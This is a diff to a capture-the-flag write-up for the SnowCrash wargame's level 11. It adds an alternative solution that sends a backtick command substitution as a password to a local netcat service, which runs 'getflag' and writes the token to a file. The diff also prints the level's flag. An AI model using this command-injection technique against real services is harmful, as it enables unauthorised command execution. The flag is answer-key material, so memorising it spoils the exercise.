@@ -54,6 +54,18 @@ Erf nope..
 
 `getflag` gets executed as sudo and piped into `wall` which will broadcast the result to us and so we directly get the flag!
 
+### Other solution
+
+A simpler one we found later:
+
+```bash
+level11@SnowCrash:~$ nc localhost 5151
+Password: `getflag > /var/crash/pass`
+Erf nope..
+level11@SnowCrash:~$ cat /var/crash/pass 
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+```
+
 ## Flag
 
 fa6v5ateaw21peobuub8ipe6s
